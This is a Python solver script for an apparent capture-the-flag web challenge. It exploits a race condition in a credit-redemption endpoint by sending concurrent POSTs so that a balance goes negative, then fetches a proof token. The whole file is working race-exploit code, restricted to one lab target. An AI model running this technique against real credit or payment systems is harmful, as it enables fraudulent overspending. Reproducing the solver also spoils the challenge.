#!/usr/bin/env python3
"""Solver for web-exploitation-day-21-double-spent (release day 27).

New bug class: credit double-spend via a non-atomic check-then-act race.
`/api/clues` discloses feature_route (POST, redeems one credit; a Rails
controller that reads the current credit count, checks it is positive, then
writes count-1 back as two separate steps with no row lock/atomic UPDATE) and
secondary_route (GET; reports proof once credits has gone negative).

A single, serial POST to feature_route behaves "correctly" (credits: 1 -> 0,
ok:true, effect:"credit_redeemed") - it does NOT exhibit the bug by itself.
The bug only shows when the account still holds exactly one credit and two
(or more) requests hit feature_route at the same wall-clock instant: both
threads can read credits=1 before either commits its decrement, so both
report ok:true and the final stored balance goes to -1 (or lower, with more
concurrent racers). secondary_route then reports the proof instead of
"credit_not_overspent".

Usage:
    python3 solve.py <base_url> [evidence_dir] [--racers N]

Stdlib only. Talks only to the one target origin given on the command line.

IMPORTANT (see NOTES.md "Gotcha" section): this is strictly one-shot per
target. Once a target's credit has been spent down to 0 by a single/serial
request, there is NO in-app way to replenish it (no reset/topup/refund route
found) - the race MUST be the very first interaction, before any solo POST
to feature_route. If you have already burned the lone credit sequentially,
the only recovery is to stop touching the target for ~30 minutes of true
inactivity so the GM tears it down on idle, then `begin` again for a fresh
target/credit=1 state.
"""
import concurrent.futures
import http.cookiejar
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
TIMEOUT = 30
PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")


class Target:
    """Cookie-jarred HTTP client scoped to exactly one target origin.

    No inter-request pacing by design here: the whole point is to fire the
    racing requests as close together as possible. Only the single initial
    `/api/clues` GET and the final `secondary_route` check are paced against
    the rest of the module's convention (not critical for a GET)."""

    def __init__(self, base_url, evidence_dir=None):
        self.base = base_url.rstrip("/")
        self.evidence_dir = evidence_dir
        self.cookiejar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cookiejar))
        if evidence_dir:
            evidence_dir.mkdir(parents=True, exist_ok=True)

    def _save(self, name, status, body):
        if not self.evidence_dir or not name:
            return
        (self.evidence_dir / f"{name}.meta.json").write_text(json.dumps({"status": status}, indent=2))
        (self.evidence_dir / f"{name}.body").write_text(body)

    def request(self, path_or_url, method="GET", data=None, headers=None, save=None):
        url = path_or_url if path_or_url.startswith("http") else self.base + path_or_url
        if not url.startswith(self.base):
            raise ValueError(f"refusing out-of-scope URL: {url}")
        body = json.dumps(data).encode() if data is not None else None
        hdrs = {"User-Agent": UA}
        if data is not None:
            hdrs["Content-Type"] = "application/json"
        hdrs.update(headers or {})
        req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
        try:
            with self.opener.open(req, timeout=TIMEOUT) as resp:
                status, text = resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as err:
            status, text = err.code, err.read().decode("utf-8", "replace")
        self._save(save, status, text)
        return status, text

    def get(self, path, headers=None, save=None):
        return self.request(path, "GET", headers=headers, save=save)

    def get_json(self, path, headers=None, save=None):
        status, body = self.get(path, headers=headers, save=save)
        try:
            return status, json.loads(body)
        except ValueError:
            return status, None

    def post_json(self, path, payload, headers=None, save=None):
        status, body = self.request(path, "POST", data=payload, headers=headers, save=save)
        try:
            return status, json.loads(body)
        except ValueError:
            return status, None


def rec_double_spend(t, clues, racers=12):
    """`/api/clues` -> feature_route (POST; redeems one credit, non-atomic
    check-then-decrement) + secondary_route (GET; reports proof once the
    stored credit count has gone negative).

    Fires `racers` concurrent POSTs to feature_route at once (a thread pool,
    not sequential - sequential calls never trigger the bug, see module
    docstring), then polls secondary_route for the proof. Only works if the
    account still holds its original single credit when this runs."""
    feature, secondary = clues.get("feature_route"), clues.get("secondary_route")
    if not feature or not secondary:
        return None

    def fire(i):
        status, body = t.post_json(feature, {}, save=f"race_{i}")
        return i, status, body

    with concurrent.futures.ThreadPoolExecutor(max_workers=racers) as ex:
        results = list(ex.map(fire, range(racers)))

    oks = [r for r in results if isinstance(r[2], dict) and r[2].get("ok") is True]
    status, verdict = t.get_json(secondary, save="audit")
    if isinstance(verdict, dict):
        text = json.dumps(verdict)
        match = PROOF_RE.search(text)
        if match:
            return match.group(0), results, verdict
    return None, results, verdict


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(2)
    base = sys.argv[1]
    evidence_dir = Path(sys.argv[2]) if len(sys.argv) > 2 and not sys.argv[2].startswith("--") else None
    racers = 12
    if "--racers" in sys.argv:
        racers = int(sys.argv[sys.argv.index("--racers") + 1])

    t = Target(base, evidence_dir)
    status, clues = t.get_json("/api/clues", save="clues")
    if status != 200 or not clues:
        print(f"no /api/clues (status {status}); cannot classify", file=sys.stderr)
        sys.exit(1)
    print("clues:", clues)

    proof, results, verdict = rec_double_spend(t, clues, racers=racers)
    ok_count = sum(1 for r in results if isinstance(r[2], dict) and r[2].get("ok") is True)
    print(f"{ok_count}/{len(results)} racing requests reported ok:true")
    print("post-race audit:", verdict)
    if proof:
        print("PROOF:", proof)
    else:
        print("no proof found - credit may already be exhausted from an earlier "
              "serial request (one-shot bug: see module docstring)", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
